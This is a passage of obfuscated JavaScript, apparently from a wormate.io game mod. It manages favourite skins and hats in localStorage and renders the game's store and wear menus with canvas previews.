    function _0x2eff80() {
      if (!_0x207b06.favoriteSkins) {
        _0x207b06.favoriteSkins = [];
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
      }
      if (_0x207b06.favoriteSkins.length > 0) {
        if (_0x207b06.currentFavSkinIndex === undefined) {
          _0x207b06.currentFavSkinIndex = 0;
        } else {
          _0x207b06.currentFavSkinIndex = (_0x207b06.currentFavSkinIndex + 1) % _0x207b06.favoriteSkins.length;
        }
        var _0x33b444 = _0x207b06.favoriteSkins[_0x207b06.currentFavSkinIndex];
        _0x567c31(_0x33b444);
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
      }
    }
    function _0x567c31(_0x42f348) {
      ooo.so.lk(_0x42f348, _0x7f096e._j.$j);
      if (_0x5c2dcc && _0x5c2dcc.n && _0x5c2dcc.n.Je) {
        var _0x59b9fe = ooo.ud.Cc().Tb(_0x42f348);
        if (_0x5c2dcc.uj && _0x59b9fe) {
          _0x5c2dcc.uj.hd(ooo.Mh.Qh.eh, ooo.ud.Cc().Ub(_0x5c2dcc.n.mi), _0x59b9fe, ooo.ud.Cc().Vb(_0x5c2dcc.n.Vi), ooo.ud.Cc().Wb(_0x5c2dcc.n.Wi), ooo.ud.Cc().Xb(_0x5c2dcc.n.Xi), ooo.ud.Cc().Yb(_0x5c2dcc.n.Yi), "#ffffff");
        }
      }
    }
    function _0x410068(_0xb90047, _0x120eb5) {
      if (!_0xb90047) {
        return "";
      }
      if (_0xb90047.startsWith("data:")) {
        return _0xb90047;
      }
      if (_0xb90047.includes("/images/skins/")) {
        return _0x207b06.s_l + "/" + _0xb90047;
      }
      if (_0xb90047.includes("/static/assets/")) {
        return "https://resources.wormate.io" + _0xb90047;
      }
      if (_0xb90047.includes("/images/skins/")) {
        return _0x207b06.s_l + _0xb90047;
      }
      if (!_0xb90047.startsWith("http")) {
        return "https://wormate.io" + _0xb90047;
      }
      return _0xb90047;
    }
    function _0x325807(_0x32bc4f) {
      if (!_0x207b06.favoriteSkins) {
        _0x207b06.favoriteSkins = [];
      }
      var _0x439eab = false;
      for (var _0x4db351 = 0; _0x4db351 < _0x207b06.favoriteSkins.length; _0x4db351++) {
        if (_0x207b06.favoriteSkins[_0x4db351] === _0x32bc4f) {
          _0x439eab = true;
          break;
        }
      }
      if (!_0x439eab) {
        _0x207b06.favoriteSkins.push(_0x32bc4f);
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
      }
    }
    function _0x56e9ef() {
      if ($("#open-favorites-btn").length === 0) {
        var _0x330e66 = $("<button id='open-favorites-btn' class='favorites-button'>عرض السكنات المفضلة</button>");
        $("<style>#open-favorites-btn { position: absolute; top: 10px; right: 10px; background: #4CAF50; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; z-index: 1000; }#open-favorites-btn:hover { background: #45a049; }</style>").appendTo("head");
        _0x330e66.click(function () {
          _0x503260();
          $(".favorites-popup").show();
        });
        if ($("#mm-skin-canv").length > 0) {
          $("#mm-skin-canv").parent().css("position", "relative");
          $("#mm-skin-canv").parent().append(_0x330e66);
        }
      }
    }
    function _0x5a23b4(_0xb25f3d) {
      if (_0x207b06.favoriteSkins && _0xb25f3d >= 0 && _0xb25f3d < _0x207b06.favoriteSkins.length) {
        _0x207b06.favoriteSkins.splice(_0xb25f3d, 1);
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        _0x503260();
      }
    }
    function _0x503260() {
      var _0x19d8fe = $(".favorites-grid");
      _0x19d8fe.empty();
      if (!_0x207b06.favoriteSkins) {
        _0x207b06.favoriteSkins = [];
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
      }
      try {
        if (_0x207b06.favoriteSkins.length > 0) {
          for (var _0xf470f5 = 0; _0xf470f5 < _0x207b06.favoriteSkins.length; _0xf470f5++) {
            var _0x4487ad = _0x207b06.favoriteSkins[_0xf470f5];
            var _0x2c9373 = $("<div>").attr("data-index", _0xf470f5).attr("data-skin-id", _0x4487ad).css({
              display: "flex",
              "flex-direction": "column",
              "align-items": "center",
              padding: "2px",
              background: "#252538",
              "border-radius": "6px",
              position: "relative",
              height: "50px",
              width: "100%"
            });
            var _0x18d89b = $("<div>").css({
              width: "100%",
              height: "46px",
              background: "transparent",
              "border-radius": "4px",
              overflow: "visible",
              position: "relative",
              display: "flex",
              "justify-content": "center",
              "align-items": "center"
            }).appendTo(_0x2c9373);
            var _0x4551b8 = $("<button>").text("X").css({
              position: "absolute",
              top: "3px",
              right: "3px",
              background: "#f44336",
              color: "white",
              border: "none",
              padding: "1px 5px",
              "border-radius": "3px",
              cursor: "pointer",
              "font-size": "11px",
              "z-index": "20"
            }).appendTo(_0x2c9373);
            var _0x26ecb5 = _0x46e69d(_0x4487ad);
            _0x18d89b.append(_0x26ecb5);
            _0x19d8fe.append(_0x2c9373);
            _0x4551b8.click(function () {
              var _0x2bb406 = $(this).closest("[data-index]");
              var _0x6de7b3 = parseInt(_0x2bb406.attr("data-index"));
              if (_0x207b06.favoriteSkins && _0x6de7b3 >= 0 && _0x6de7b3 < _0x207b06.favoriteSkins.length) {
                _0x207b06.favoriteSkins.splice(_0x6de7b3, 1);
                localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
                _0x2bb406.fadeOut(300, function () {
                  $(this).remove();
                  _0x19d8fe.find("[data-index]").each(function (_0x392631) {
                    $(this).attr("data-index", _0x392631);
                  });
                  if (_0x207b06.favoriteSkins.length === 0) {
                    _0xed36d0(_0x19d8fe);
                  }
                });
              }
            });
          }
        } else {
          _0xed36d0(_0x19d8fe);
        }
      } catch (_0x39e613) {
        _0x19d8fe.append("<div style='text-align:center;padding:10px;color:#ff6b6b;grid-column:1/span 2;'>Error loading favorites</div>");
      }
    }
    function _0xed36d0(_0x7fa820) {
      _0x7fa820.append("<div style='text-align:center;padding:10px;color:#aaa;margin:20px 0;grid-column:1/span 2;'>You don't have any favorite skins yet.</div>");
    }
    function _0x46e69d(_0x3764f2) {
      if (!window.textureCache) {
        window.textureCache = {};
      }
      try {
        let _0x14debe = null;
        if (typeof ooo !== "undefined") {
          if (ooo.ud && ooo.ud.Gc) {
            _0x14debe = ooo.ud.Gc();
          } else if (ooo.ok && ooo.ok.xl && ooo.ok.xl.skinData) {
            _0x14debe = ooo.ok.xl.skinData;
          } else if (window.globalGameData) {
            _0x14debe = window.globalGameData;
          }
        }
        if (!_0x14debe) {
          const _0x157831 = localStorage.getItem("wupsw");
          if (_0x157831) {
            try {
              _0x14debe = JSON.parse(_0x157831);
            } catch (_0x4250f0) {}
          }
        }
        if (!_0x14debe) {
          throw new Error("Game data not available");
        }
        let _0x16d758 = null;
        if (_0x14debe.skinArrayDict && Array.isArray(_0x14debe.skinArrayDict)) {
          _0x16d758 = _0x14debe.skinArrayDict;
        } else if (_0x14debe.skins && Array.isArray(_0x14debe.skins)) {
          _0x16d758 = _0x14debe.skins;
        } else {
          throw new Error("Skin list not found in game data");
        }
        let _0x3f8744 = null;
        for (let _0x40402a = 0; _0x40402a < _0x16d758.length; _0x40402a++) {
          if (_0x16d758[_0x40402a] && _0x16d758[_0x40402a].id === _0x3764f2) {
            _0x3f8744 = _0x16d758[_0x40402a];
            break;
          }
        }
        if (!_0x3f8744) {
          throw new Error("Skin not found");
        }
        const _0x3198d2 = document.createElement("div");
        _0x3198d2.style.cssText = "\n                width: 100%;\n                height: 100%;\n                position: relative;\n                overflow: visible;\n            ";
        const _0x3d9bdc = document.createElement("div");
        _0x3d9bdc.textContent = "#" + _0x3764f2;
        _0x3d9bdc.style.cssText = "\n                position: absolute;\n                top: 3px;\n                left: 2px;\n                background-color: rgba(0,0,0,0.6);\n                color: white;\n                font-size: 11px;\n                padding: 1px 4px;\n                border-radius: 3px;\n                z-index: 10;\n            ";
        _0x3198d2.appendChild(_0x3d9bdc);
        const _0x3b8cf4 = document.createElement("canvas");
        _0x3b8cf4.width = 600;
        _0x3b8cf4.height = 80;
        _0x3b8cf4.style.cssText = "\n                position: absolute;\n                top: 0;\n                left: 0;\n                width: 100%;\n                height: 100%;\n                object-fit: contain;\n                padding: 5px;\n            ";
        _0x3198d2.appendChild(_0x3b8cf4);
        const _0x5648e6 = _0x3b8cf4.getContext("2d");
        _0x5648e6.clearRect(0, 0, _0x3b8cf4.width, _0x3b8cf4.height);
        if (_0x3f8744.base && Array.isArray(_0x3f8744.base) && _0x3f8744.base.length > 0) {
          let _0x16bb00 = {};
          let _0x3f69b3 = [];
          _0x3f8744.base.forEach(_0x35dcca => {
            if (!_0x35dcca) {
              return;
            }
            if (_0x14debe.regionDict && _0x14debe.regionDict[_0x35dcca]) {
              const _0x5006fd = _0x14debe.regionDict[_0x35dcca];
              if (_0x14debe.textureDict && _0x5006fd.texture && _0x14debe.textureDict[_0x5006fd.texture]) {
                const _0x226122 = _0x14debe.textureDict[_0x5006fd.texture];
                if (_0x226122 && (_0x226122.file || _0x226122.relativePath)) {
                  let _0x2d2a0a = _0x410068(_0x226122.relativePath || _0x226122.file, _0x5006fd.texture);
                  if (!_0x16bb00[_0x2d2a0a]) {
                    _0x16bb00[_0x2d2a0a] = [];
                  }
                  _0x16bb00[_0x2d2a0a].push({
                    id: _0x35dcca,
                    region: _0x5006fd
                  });
                  _0x3f69b3.push({
                    id: _0x35dcca,
                    region: _0x5006fd
                  });
                }
              }
            }
          });
          const _0x293bf9 = [..._0x3f69b3].reverse();
          let _0x494484 = [..._0x293bf9];
          while (_0x494484.length < 27) {
            const _0x1f9684 = 27 - _0x494484.length;
            const _0x5a6565 = _0x293bf9.slice(0, Math.min(_0x1f9684, _0x293bf9.length));
            _0x494484 = [..._0x494484, ..._0x5a6565];
          }
          const _0x31307a = 80;
          const _0x387164 = _0x31307a / 2;
          const _0x119923 = 0.2;
          const _0x251360 = _0x31307a * _0x119923 * _0x494484.length + _0x31307a * 0.75;
          _0x3b8cf4.width = Math.max(600, _0x251360);
          _0x5648e6.clearRect(0, 0, _0x3b8cf4.width, _0x3b8cf4.height);
          let _0x54cb23 = 0;
          const _0x5e78fa = Object.keys(_0x16bb00).length;
          function _0x5b33d9(_0x55eb65) {
            _0x1d5d84(_0x55eb65);
          }
          function _0x1d5d84(_0x1c0290) {
            const _0x1058b7 = _0x3b8cf4.height / 2;
            _0x494484.forEach((_0x203f7a, _0x5a20e1) => {
              if (!_0x203f7a) {
                return;
              }
              const _0x2a412f = _0x203f7a.region;
              const _0x3b9641 = _0x387164 + _0x5a20e1 * _0x387164 * 2 * _0x119923;
              _0x5648e6.save();
              _0x5648e6.beginPath();
              _0x5648e6.arc(_0x3b9641, _0x1058b7, _0x387164, 0, Math.PI * 2);
              _0x5648e6.clip();
              const _0x479e45 = Math.max(_0x2a412f.w, _0x2a412f.h);
              const _0x3873eb = _0x387164 * 2 / _0x479e45;
              const _0x4f324b = _0x3b9641 - _0x2a412f.w * _0x3873eb / 2;
              const _0x28016c = _0x1058b7 - _0x2a412f.h * _0x3873eb / 2;
              _0x5648e6.drawImage(_0x1c0290, _0x2a412f.x, _0x2a412f.y, _0x2a412f.w, _0x2a412f.h, _0x4f324b, _0x28016c, _0x2a412f.w * _0x3873eb, _0x2a412f.h * _0x3873eb);
              _0x5648e6.restore();
            });
          }
          Object.keys(_0x16bb00).forEach(_0x44330d => {
            if (window.textureCache[_0x44330d]) {
              _0x5b33d9(window.textureCache[_0x44330d]);
              return;
            }
            const _0x2dea29 = new Image();
            _0x2dea29.onload = () => {
              window.textureCache[_0x44330d] = _0x2dea29;
              _0x5b33d9(_0x2dea29);
              _0x54cb23++;
            };
            _0x2dea29.onerror = () => {
              _0x54cb23++;
            };
            _0x2dea29.src = _0x44330d;
          });
          return _0x3198d2;
        }
      } catch (_0x5b0f9b) {
        const _0x69404b = document.createElement("div");
        _0x69404b.style.cssText = "\n                width: 100%;\n                height: 100%;\n                display: flex;\n                justify-content: center;\n                align-items: center;\n                color: white;\n                background-color: #333;\n            ";
        _0x69404b.textContent = "⚠️";
        return _0x69404b;
      }
      const _0x1ee9e9 = document.createElement("div");
      _0x1ee9e9.style.cssText = "\n            width: 100%;\n            height: 100%;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            color: white;\n            background-color: #333;\n        ";
      _0x1ee9e9.textContent = "🎮";
      return _0x1ee9e9;
    }
    _0x56810a = function () {
      function _0xcd7ea0(_0x34b6ce, _0x4f1e2c) {
        this.Cp = _0x34b6ce;
        this.yp = 0;
        this.xp = _0x4f1e2c;
      }
      _0xcd7ea0.prototype.qp = function () {
        if (--this.yp < 0) {
          this.yp = this.xp.list.length - 1;
        }
        this.Cp.tp(true);
      };
      _0xcd7ea0.prototype.rp = function () {
        if (++this.yp >= this.xp.list.length) {
          this.yp = 0;
        }
        this.Cp.tp(true);
      };
      _0xcd7ea0.prototype.up = function () {
        let _0x266030 = _0x331039.V(this.xp.name);
        if (this.xp.img) {
          if ((this.xp.img.search("data:image/png;base64,") == -1 || !(_0x266030 = "<img src=\"" + this.xp.img + "\" height=\"40\" />")) && (this.xp.img.search("https://lh3.googleusercontent.com") == -1 || !(_0x266030 = "<img src=\"" + this.xp.img + "\" height=\"40\" />"))) {
            _0x266030 = "<img src=\"" + _0x207b06.s_l + "/images/" + this.xp.img + "\" height=\"40\" />";
          }
        }
        return _0x266030;
      };
      _0xcd7ea0.prototype.Ap = function () {
        if (this.yp >= this.xp.list.length) {
          return _0x7f096e.yj.Aj();
        } else {
          return _0x7f096e.yj.Bj(this.xp.list[this.yp]);
        }
      };
      return _0xcd7ea0;
    }();
    _0x7f096e.Rk = _0x4a5632;
    _0x20e109 = $("#store-go-coins-button");
    _0x1a8d23 = $("#store-go-skins-button");
    _0x3b90c2 = $("#store-go-wear-button");
    (_0x29975b = _0x331039.ca(_0x7f096e.Ho, function () {
      _0x7f096e.Ho.call(this, _0x331039.U("index.game.popup.menu.store.tab"), true);
      _0x20e109.click(function () {
        ooo.ij.if();
        ooo.Xg.gl(ooo.Xg.Hk);
      });
      _0x1a8d23.click(function () {
        ooo.ij.if();
        ooo.Xg.gl(ooo.Xg.Qk);
      });
      _0x3b90c2.click(function () {
        ooo.ij.if();
        ooo.Xg.gl(ooo.Xg.Uk);
      });
    })).prototype.Sa = function () {
      _0x29975b.parent.prototype.Sa.call(this);
    };
    _0x29975b.prototype.Wo = function () {
      _0x4ead11.f.h(_0x7f096e.Ho.Mo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.No, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Oo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Po, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Qo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Ro, 50);
      _0x4ead11.f.g(_0x7f096e.Ho.So, 200);
      _0x4ead11.f.h(_0x7f096e.Ho.To, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Uo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Vo, 50);
    };
    _0x29975b.prototype.nl = function () {
      ooo.ij.jf();
    };
    _0x7f096e.Tk = _0x29975b;
    _0x37b2b6 = $("#wear-view-canv");
    _0x4d3601 = $("#wear-description-text");
    _0x359b75 = $("#wear-locked-bar");
    _0x59526d = $("#wear-locked-bar-text");
    _0x3ef8b6 = $("#wear-buy-button");
    _0x3af96c = $("#wear-item-price");
    _0x12b9fd = $("#wear-eyes-button");
    _0x4e8351 = $("#wear-mouths-button");
    _0x47207f = $("#wear-glasses-button");
    _0x328ede = $("#wear-hats-button");
    _0x4e7822 = $("#wear-tint-chooser");
    _0x4cb0d1 = $("#wear-view-prev");
    _0x43e97e = $("#wear-view-next");
    (_0x58e333 = _0x331039.ca(_0x7f096e.Ho, function () {
      var _0x225bfa = this;
      _0x7f096e.Ho.call(this, _0x331039.U("index.game.popup.menu.wear.tab"), true);
      var _0xaa0fae = this;
      this.Dp = [];
      this.ak = new _0x3bd2c9(this, _0x7f096e._j.ak, _0x12b9fd);
      this.bk = new _0x3bd2c9(this, _0x7f096e._j.bk, _0x4e8351);
      this.dk = new _0x3bd2c9(this, _0x7f096e._j.dk, _0x47207f);
      this.ck = new _0x3bd2c9(this, _0x7f096e._j.ck, _0x328ede);
      this.Ep = null;
      this.Fp = null;
      this.Gp = null;
      this.Hp = null;
      this.Ip = null;
      this.Jp = null;
      this.op = new _0x7f096e.Lm(_0x37b2b6);
      _0x3ef8b6.click(function () {
        ooo.ij.if();
        _0xaa0fae.Kp();
      });
      _0x4cb0d1.click(function () {
        ooo.ij.if();
        _0xaa0fae.Ep.Lp();
      });
      _0x43e97e.click(function () {
        ooo.ij.if();
        _0xaa0fae.Ep.Mp();
      });
      _0x12b9fd.click(function () {
        ooo.ij.if();
        _0xaa0fae.Np(_0x225bfa.ak);
      });
      _0x4e8351.click(function () {
        ooo.ij.if();
        _0xaa0fae.Np(_0x225bfa.bk);
      });
      _0x47207f.click(function () {
        ooo.ij.if();
        _0xaa0fae.Np(_0x225bfa.dk);
      });
      _0x328ede.click(function () {
        ooo.ij.if();
        _0xaa0fae.Np(_0x225bfa.ck);
      });
      this.Dp.push(this.ak);
      this.Dp.push(this.bk);
      this.Dp.push(this.dk);
      this.Dp.push(this.ck);
    })).prototype.Sa = function () {
      _0x58e333.parent.prototype.Sa.call(this);
      var _0x2cea67 = this;
      ooo.ud.Jc(function () {
        var _0x2fed17 = ooo.ud.Gc();
        _0x2cea67.Fp = _0x2fed17.eyesDict;
        _0x2cea67.Gp = _0x2fed17.mouthDict;
        _0x2cea67.Hp = _0x2fed17.glassesDict;
        _0x2cea67.Ip = _0x2fed17.hatDict;
        _0x2cea67.Jp = _0x2fed17.colorDict;
        _0x2cea67.ak.Op(_0x2fed17.eyesVariantArray);
        _0x2cea67.ak.Pp(_0x2cea67.Fp);
        _0x2cea67.bk.Op(_0x2fed17.mouthVariantArray);
        _0x2cea67.bk.Pp(_0x2cea67.Gp);
        _0x2cea67.dk.Op(_0x2fed17.glassesVariantArray);
        _0x2cea67.dk.Pp(_0x2cea67.Hp);
        _0x2cea67.ck.Op(_0x2fed17.hatVariantArray);
        _0x2cea67.ck.Pp(_0x2cea67.Ip);
      });
      this.tp(false);
      ooo.so.fk(function () {
        _0x2cea67.tp(false);
      });
    };
    _0x58e333.prototype.Wo = function () {
      _0x4ead11.f.h(_0x7f096e.Ho.Mo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.No, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Oo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Po, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Qo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Ro, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.So, 50);
      _0x4ead11.f.g(_0x7f096e.Ho.To, 200);
      _0x4ead11.f.h(_0x7f096e.Ho.Uo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Vo, 50);
    };
    _0x58e333.prototype.nl = function () {
      ooo.ij.Ye(_0x7f096e.Pe.Se.Jf);
      ooo.ij.jf();
      this.Np(this.Ep ?? this.ak);
      this.op.rg(true);
    };
    _0x58e333.prototype.hl = function () {
      this.op.rg(false);
    };
    _0x58e333.prototype.qg = function () {
      this.op.qg();
    };
    _0x58e333.prototype.ug = function (_0x47fc94, _0x14dea7) {
      this.op.ug();
    };
    _0x58e333.prototype.Np = function (_0x45043d) {
      this.Ep = _0x45043d;
      for (var _0xb103eb = 0; _0xb103eb < this.Dp.length; _0xb103eb++) {
        this.Dp[_0xb103eb].ep.removeClass("pressed");
      }
      ;
      this.Ep.ep.addClass("pressed");
      this.Ep.ml();
    };
    _0x58e333.prototype.Qp = function () {
      if (this.Ep == null) {
        return _0x7f096e.yj.Aj();
      } else {
        return _0x7f096e.yj.Bj({
          Je: this.Ep.Ap(),
          Wd: this.Ep.Wd
        });
      }
    };
    _0x58e333.prototype.Kp = function () {
      var _0x3a91e6 = this.Qp();
      if (_0x3a91e6.Cj()) {
        var _0x2c7525 = _0x3a91e6.Mc();
        this.Rp(_0x2c7525.Je, _0x2c7525.Wd);
      }
    };
    _0x58e333.prototype.Rp = function (_0x17aabf, _0x4a6ff5) {
      var _0x119d2c = ooo.so.mk(_0x17aabf, _0x4a6ff5);
      if (_0x119d2c != null) {
        var _0x2749a6 = _0x119d2c.pk();
        if (!(ooo.ok.Ql() < _0x2749a6)) {
          var _0x1fba2c = ooo.so.Zj(_0x7f096e._j.$j);
          var _0x3dac89 = ooo.so.Zj(_0x7f096e._j.ak);
          var _0x1235f6 = ooo.so.Zj(_0x7f096e._j.bk);
          var _0x121338 = ooo.so.Zj(_0x7f096e._j.dk);
          var _0x50bb3f = ooo.so.Zj(_0x7f096e._j.ck);
          var _0x416a67 = this.Xo(5000);
          ooo.ok.nm(_0x17aabf, _0x4a6ff5, function () {
            _0x416a67._o();
            ooo.Xg.gl(ooo.Xg._k);
          }, function () {
            ooo.ok.hm(function () {
              ooo.so.lk(_0x1fba2c, _0x7f096e._j.$j);
              ooo.so.lk(_0x3dac89, _0x7f096e._j.ak);
              ooo.so.lk(_0x1235f6, _0x7f096e._j.bk);
              ooo.so.lk(_0x121338, _0x7f096e._j.dk);
              ooo.so.lk(_0x50bb3f, _0x7f096e._j.ck);
              ooo.so.lk(_0x17aabf, _0x4a6ff5);
              _0x416a67._o();
            });
          });
        }
      }
    };
    window.globalHatTextureCache = window.globalHatTextureCache || {};
    _0x58e333.prototype.tp = function (_0x5f4969) {
      var _0x2a8da2 = ooo.so.ek();
      var _0x25dea4 = this.Qp();
      if (_0x25dea4.Cj()) {
        var _0x3b003c = _0x25dea4.Mc();
        var _0x47ab7b = ooo.so.mk(_0x3b003c.Je, _0x3b003c.Wd);
        var _0x12db75 = false;
        if (!_0x3b003c.selectedHats) {
          _0x3b003c.selectedHats = [];
        }
        if (ooo.so.ik(_0x3b003c.Je, _0x3b003c.Wd)) {
          _0x359b75.hide();
          _0x3ef8b6.hide();
          if (_0x3b003c.Wd === "HAT") {
            this.addSelectedHatButton(_0x3b003c.Je);
          } else {
            this.removeHatButtons();
          }
        } else if (_0x47ab7b == null || _0x47ab7b.qk()) {
          _0x12db75 = true;
          _0x359b75.show();
          _0x3ef8b6.hide();
          _0x59526d.text(_0x331039.U("index.game.popup.menu.store.locked"));
          if (_0x47ab7b != null && _0x47ab7b.qk()) {
            var _0x247f8f = ooo.ud.Gc().textDict[_0x47ab7b.ln()];
            if (_0x247f8f != null) {
              _0x59526d.text(_0x331039.V(_0x247f8f));
            }
          }
          this.removeHatButtons();
        } else {
          _0x359b75.hide();
          _0x3ef8b6.show();
          _0x3af96c.html(_0x47ab7b.pk());
          this.removeHatButtons();
        }
        _0x4d3601.html("");
        if (_0x47ab7b != null && _0x47ab7b.mn() != null) {
          var _0xc421e5 = ooo.ud.Gc().textDict[_0x47ab7b.mn()];
          if (_0xc421e5 != null) {
            _0x4d3601.html(_0x331039.aa(_0x331039.V(_0xc421e5)));
          }
        }
        var _0xc4adb8 = this.op;
        switch (_0x3b003c.Wd) {
          case "EYES":
            _0xc4adb8.Gm(_0x2a8da2.Dn(_0x3b003c.Je));
            _0xc4adb8.bn(_0x12db75);
            break;
          case "MOUTH":
            _0xc4adb8.Gm(_0x2a8da2.En(_0x3b003c.Je));
            _0xc4adb8.cn(_0x12db75);
            break;
          case "GLASSES":
            _0xc4adb8.Gm(_0x2a8da2.Gn(_0x3b003c.Je));
            _0xc4adb8.en(_0x12db75);
            break;
          case "HAT":
            _0xc4adb8.Gm(_0x2a8da2.Fn(_0x3b003c.Je));
            _0xc4adb8.dn(_0x12db75);
            break;
        }
        if (_0x5f4969) {
          ooo.so.lk(_0x3b003c.Je, _0x3b003c.Wd);
        }
      }
    };
    _0x58e333.prototype.addSelectedHatButton = function (_0x1a2374) {
      this.currentHatId = _0x1a2374;
      if (!this.hatButtonContainer) {
        this.hatButtonContainer = $("<div>").attr("id", "hat-button-container").css({
          position: "absolute",
          bottom: "30px",
          left: "-10px",
          display: "flex",
          gap: "5px"
        }).appendTo("#wear-view");
        this.hatToggleButton = $("<button>").attr("id", "hat-toggle-button").css({
          padding: "5px 10px",
          "background-color": "#4CAF50",
          color: "white",
          border: "none",
          "border-radius": "4px",
          cursor: "pointer",
          "min-width": "32px"
        }).appendTo(this.hatButtonContainer);
        this.hatFavoritesButton = $("<button>").attr("id", "hat-favorites-button").css({
          padding: "5px 10px",
          "background-color": "#2196F3",
          color: "white",
          border: "none",
          "border-radius": "4px",
          cursor: "pointer"
        }).text("☰ Favorites").appendTo(this.hatButtonContainer);
        this.hatInfoText = $("<div>").attr("id", "hat-info-text").css({
          position: "absolute",
          bottom: "10px",
          left: "-5px",
          "font-size": "12px",
          color: "#fff"
        }).text("Press '( 2 )' to toggle hats during gameplay").appendTo("#wear-view");
        var _0x23224a = this;
        this.hatFavoritesButton.on("click", function () {
          _0x23224a.showFavoritesDialog();
        });
      }
      let _0x5351db = _0x207b06.selectedHats.includes(_0x1a2374);
      this.hatToggleButton.text(_0x5351db ? "X" : "★ Add");
      this.hatToggleButton.css("background-color", _0x5351db ? "#f44336" : "#4CAF50");
      this.hatToggleButton.off("click");
      var _0x23224a = this;
      this.hatToggleButton.on("click", function () {
        let _0x14508d = _0x207b06.selectedHats.indexOf(_0x1a2374);
        if (_0x14508d >= 0) {
          _0x207b06.selectedHats.splice(_0x14508d, 1);
          $(this).text("Add").css("background-color", "#4CAF50");
        } else {
          _0x207b06.selectedHats.push(_0x1a2374);
          $(this).text("X").css("background-color", "#f44336");
        }
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
      });
      this.hatButtonContainer.show();
      this.hatInfoText.show();
    };
    _0x58e333.prototype.removeHatButtons = function () {
      if (this.hatButtonContainer) {
        this.hatButtonContainer.hide();
      }
      if (this.hatInfoText) {
        this.hatInfoText.hide();
      }
    };
    function _0x3226dc(_0x1e1c1c) {
      try {
        if (window.globalHatTextureCache[_0x1e1c1c] && window.globalHatTextureCache[_0x1e1c1c].valid) {
          return window.globalHatTextureCache[_0x1e1c1c];
        }
        const _0x2f648e = ooo.ud.Cc().Yb(_0x1e1c1c);
        if (!_0x2f648e || !_0x2f648e.dc || !_0x2f648e.dc.length) {
          return null;
        }
        const _0x322f07 = _0x2f648e.dc[0];
        let _0x49fc61 = null;
        if (_0x322f07._a !== undefined) {
          _0x49fc61 = {
            x: _0x322f07._a || 0,
            y: _0x322f07.ab || 0,
            width: _0x322f07.bb || 0,
            height: _0x322f07.cb || 0
          };
        } else if (_0x322f07._frame) {
          _0x49fc61 = {
            x: _0x322f07._frame.x || 0,
            y: _0x322f07._frame.y || 0,
            width: _0x322f07._frame.width || 0,
            height: _0x322f07._frame.height || 0
          };
        } else if (_0x322f07.orig) {
          _0x49fc61 = {
            x: _0x322f07.orig.x || 0,
            y: _0x322f07.orig.y || 0,
            width: _0x322f07.orig.width || 0,
            height: _0x322f07.orig.height || 0
          };
        } else if (_0x322f07.va && _0x322f07.va.length >= 4) {
          _0x49fc61 = {
            x: _0x322f07.va[0] || 0,
            y: _0x322f07.va[1] || 0,
            width: _0x322f07.va[2] || 0,
            height: _0x322f07.va[3] || 0
          };
        }
        let _0xb6b70c = null;
        if (_0x322f07.Za && _0x322f07.Za.baseTexture && _0x322f07.Za.baseTexture.resource && _0x322f07.Za.baseTexture.resource.source) {
          _0xb6b70c = _0x322f07.Za.baseTexture.resource.source;
        } else if (_0x322f07.baseTexture && _0x322f07.baseTexture.resource && _0x322f07.baseTexture.resource.source) {
          _0xb6b70c = _0x322f07.baseTexture.resource.source;
        } else if (_0x322f07.baseTexture && _0x322f07.baseTexture.resource && _0x322f07.baseTexture.resource.data) {
          _0xb6b70c = _0x322f07.baseTexture.resource.data;
        } else if (_0x322f07.baseTexture && _0x322f07.baseTexture.source) {
          _0xb6b70c = _0x322f07.baseTexture.source;
        }
        const _0x4521bf = {
          hatId: _0x1e1c1c,
          image: _0xb6b70c || null,
          coords: _0x49fc61 || null,
          textureData: _0x322f07,
          hatData: _0x2f648e,
          valid: _0xb6b70c && _0x49fc61 ? true : false
        };
        window.globalHatTextureCache[_0x1e1c1c] = _0x4521bf;
        return _0x4521bf;
      } catch (_0x3402ad) {
        return null;
      }
    }
    function _0x3d52b8(_0x3eaecb) {
      try {
        const _0x226480 = document.createElement("div");
        _0x226480.style.cssText = "\n                width: 100%;\n                height: 100%;\n                position: relative;\n                overflow: visible;\n                display: flex;\n                justify-content: center;\n                align-items: center;\n            ";
        const _0x5a3303 = document.createElement("div");
        _0x5a3303.textContent = "#" + _0x3eaecb;
        _0x5a3303.style.cssText = "\n                position: absolute;\n                top: 4px;\n                left: 4px;\n                background-color: rgba(0,0,0,0.6);\n                color: white;\n                font-size: 12px;\n                padding: 2px 5px;\n                border-radius: 3px;\n                z-index: 10;\n            ";
        _0x226480.appendChild(_0x5a3303);
        const _0x1981ce = document.createElement("canvas");
        _0x1981ce.width = 80;
        _0x1981ce.height = 80;
        _0x1981ce.style.cssText = "\n                display: block;\n                object-fit: contain;\n            ";
        _0x226480.appendChild(_0x1981ce);
        const _0x4e718c = _0x1981ce.getContext("2d", {
          willReadFrequently: true
        });
        _0x4e718c.clearRect(0, 0, _0x1981ce.width, _0x1981ce.height);
        const _0x438cdb = _0x3226dc(_0x3eaecb);
        if (!_0x438cdb || !_0x438cdb.image || !_0x438cdb.coords) {
          _0x4e718c.fillStyle = "#333";
          _0x4e718c.fillRect(0, 0, _0x1981ce.width, _0x1981ce.height);
          _0x4e718c.fillStyle = "white";
          _0x4e718c.font = "18px Arial";
          _0x4e718c.textAlign = "center";
          _0x4e718c.fillText("#" + _0x3eaecb, _0x1981ce.width / 2, _0x1981ce.height / 2);
          return _0x226480;
        }
